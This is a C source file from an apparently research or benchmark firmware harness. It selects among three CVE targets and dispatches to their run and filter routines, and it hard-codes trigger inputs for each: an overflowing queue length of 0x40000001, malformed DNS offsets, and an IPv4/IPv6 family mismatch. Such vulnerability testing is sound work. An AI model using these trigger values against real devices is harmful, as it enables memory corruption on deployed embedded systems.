#include "cve_target.h"

#include <string.h>

#include "SEGGER_RTT.h"

#include "core/app/app_mode.h"
#include "compare/console/console.h"
#include "cve_target_impl.h"

static const UBaseType_t g_cve2024_2212_queue_length = 0x40000001u;
static const UBaseType_t g_cve2024_2212_item_size = 0x00000004u;

static cve_target_t g_current_target = CVE_TARGET_CVE2024_2212;
static bool g_benchmark_override_valid = false;
static cve_target_input_t g_benchmark_override_input = {0};

static void cve_target_build_input_from_regs(cve_target_t target,
                                             uint32_t r0,
                                             uint32_t r1,
                                             uint32_t r2,
                                             uint32_t r3,
                                             cve_target_input_t *input) {
    if (input == NULL) {
        return;
    }

    memset(input, 0, sizeof(*input));
    input->target = target;

    if (target == CVE_TARGET_CVE2024_2212) {
        input->queue_length = (UBaseType_t)r0;
        input->item_size = (UBaseType_t)r1;
        input->runtime_arg0 = r0;
        input->runtime_arg1 = r1;
        return;
    }

    input->runtime_arg0 = r0;
    input->runtime_arg1 = r1;
    input->runtime_arg2 = r2;
    input->runtime_arg3 = r3;
}

const char *cve_target_name(cve_target_t target) {
    if (target == CVE_TARGET_CVE2025_1674) {
        return "CVE2025-1674";
    }
    if (target == CVE_TARGET_CVE2025_12899) {
        return "CVE2025-12899";
    }
    return "CVE2024-2212";
}

const char *cve_target_cli_name(cve_target_t target) {
    if (target == CVE_TARGET_CVE2025_1674) {
        return "cve2025-1674";
    }
    if (target == CVE_TARGET_CVE2025_12899) {
        return "cve2025-12899";
    }
    return "cve2024-2212";
}

bool cve_target_parse_name(const char *text, cve_target_t *target) {
    if (text == NULL || target == NULL) {
        return false;
    }

    if (strcmp(text, "cve2024-2212") == 0 || strcmp(text, "cve-2024-2212") == 0 || strcmp(text, "2212") == 0) {
        *target = CVE_TARGET_CVE2024_2212;
        return true;
    }

    if (strcmp(text, "cve2025-1674") == 0 || strcmp(text, "cve-2025-1674") == 0 || strcmp(text, "1674") == 0) {
        *target = CVE_TARGET_CVE2025_1674;
        return true;
    }

    if (strcmp(text, "cve2025-12899") == 0 || strcmp(text, "cve-2025-12899") == 0 || strcmp(text, "12899") == 0) {
        *target = CVE_TARGET_CVE2025_12899;
        return true;
    }

    return false;
}

void cve_target_set_current(cve_target_t target) {
    g_current_target = target;
}

cve_target_t cve_target_get_current(void) {
    return g_current_target;
}

void cve_target_print_status(void) {
    SEGGER_RTT_printf(0, "[target] current vulnerability: %s\r\n", cve_target_name(g_current_target));
}

void cve_target_set_benchmark_override_from_regs(uint32_t r0,
                                                 uint32_t r1,
                                                 uint32_t r2,
                                                 uint32_t r3) {
    cve_target_build_input_from_regs(cve_target_get_current(), r0, r1, r2, r3, &g_benchmark_override_input);
    g_benchmark_override_valid = true;
}

void cve_target_clear_benchmark_override(void) {
    g_benchmark_override_valid = false;
}

void cve_target_get_attack_inputs(cve_target_input_t *input) {
    if (input == NULL) {
        return;
    }

    input->target = g_current_target;
    input->queue_length = 0u;
    input->item_size = 0u;
    input->runtime_arg0 = 0u;
    input->runtime_arg1 = 0u;
    input->runtime_arg2 = 0u;
    input->runtime_arg3 = 0u;

    if (g_current_target == CVE_TARGET_CVE2024_2212) {
        input->queue_length = g_cve2024_2212_queue_length;
        input->item_size = g_cve2024_2212_item_size;
        input->runtime_arg0 = input->queue_length;
        input->runtime_arg1 = input->item_size;
        return;
    }

    if (g_current_target == CVE_TARGET_CVE2025_1674) {
        input->runtime_arg0 = 12u; /* answer_offset */
        input->runtime_arg1 = 18u; /* msg_size */
        input->runtime_arg2 = 3u;  /* dname_len */
        input->runtime_arg3 = 3u;  /* rem_size */
        return;
    }

    input->runtime_arg0 = 4u;   /* pkt_family IPv4 */
    input->runtime_arg1 = 6u;   /* handler_family IPv6 */
    input->runtime_arg2 = 128u; /* icmp type */
    input->runtime_arg3 = 0u;   /* icmp code */
}

bool cve_target_fetch_inputs(cve_target_input_t *input, bool *auto_fed) {
    app_exec_mode_t exec_mode = app_get_exec_mode();
    bool fed = exec_mode != APP_EXEC_MODE_INTERACTIVE;

    if (input == NULL) {
        return false;
    }

    if (exec_mode == APP_EXEC_MODE_BENCHMARK && g_benchmark_override_valid) {
        memcpy(input, &g_benchmark_override_input, sizeof(*input));
        if (auto_fed != NULL) {
            *auto_fed = true;
        }
        return true;
    }

    cve_target_get_attack_inputs(input);

    if (g_current_target == CVE_TARGET_CVE2024_2212 && !fed) {
        if (!prompt_rtt_u32("Enter uxQueueLength: ", &input->queue_length)) {
            return false;
        }
        if (!prompt_rtt_u32("Enter uxItemSize: ", &input->item_size)) {
            return false;
        }
    }

    if (auto_fed != NULL) {
        *auto_fed = fed;
    }

    return true;
}

void cve_target_print_attack_input(const cve_target_input_t *input) {
    cve_target_t target = g_current_target;

    if (input != NULL) {
        target = input->target;
    }

    if (target == CVE_TARGET_CVE2024_2212) {
        SEGGER_RTT_printf(0,
            "\r\n[Input]\r\n"
            "  target         = %s\r\n"
            "  uxQueueLength  = 0x%08X\r\n"
            "  uxItemSize     = 0x%08X\r\n",
            cve_target_name(target),
            (input != NULL) ? (uint32_t)input->queue_length : 0u,
            (input != NULL) ? (uint32_t)input->item_size : 0u);
        return;
    }

    if (target == CVE_TARGET_CVE2025_1674) {
        SEGGER_RTT_printf(0,
            "\r\n[Input]\r\n"
            "  target         = %s\r\n"
            "  msg_size       = %lu\r\n"
            "  answer_offset  = %lu\r\n"
            "  dname_len      = %lu\r\n"
            "  rem_size       = %lu\r\n",
            cve_target_name(target),
            (unsigned long)((input != NULL) ? input->runtime_arg1 : 0u),
            (unsigned long)((input != NULL) ? input->runtime_arg0 : 0u),
            (unsigned long)((input != NULL) ? input->runtime_arg2 : 0u),
            (unsigned long)((input != NULL) ? input->runtime_arg3 : 0u));
        return;
    }

    SEGGER_RTT_printf(0,
        "\r\n[Input]\r\n"
        "  target             = %s\r\n"
        "  packet family      = %lu\r\n"
        "  registered handler = %lu\r\n"
        "  icmp type/code     = %lu/%lu\r\n"
        "  adjacent bytes     = 32\r\n",
        cve_target_name(target),
        (unsigned long)((input != NULL) ? input->runtime_arg0 : 0u),
        (unsigned long)((input != NULL) ? input->runtime_arg1 : 0u),
        (unsigned long)((input != NULL) ? input->runtime_arg2 : 0u),
        (unsigned long)((input != NULL) ? input->runtime_arg3 : 0u));
}

int cve_target_run(const cve_target_input_t *input,
                   bool verbose,
                   const cve_target_profile_t *profile) {
    cve_target_t target = g_current_target;

    if (input != NULL) {
        target = input->target;
    }

    if (target == CVE_TARGET_CVE2025_1674) {
        return cve2025_1674_run(input, verbose, profile);
    }

    if (target == CVE_TARGET_CVE2025_12899) {
        return cve2025_12899_run(input, verbose, profile);
    }

    return cve2024_2212_run(input, verbose, profile);
}

bool cve_target_evaluate_filter(const cve_target_input_t *input,
                                cve_target_filter_result_t *result) {
    cve_target_t target = g_current_target;

    if (input != NULL) {
        target = input->target;
    }

    if (target == CVE_TARGET_CVE2025_1674) {
        return cve2025_1674_evaluate_filter(input, result);
    }

    if (target == CVE_TARGET_CVE2025_12899) {
        return cve2025_12899_evaluate_filter(input, result);
    }

    return cve2024_2212_evaluate_filter(input, result);
}
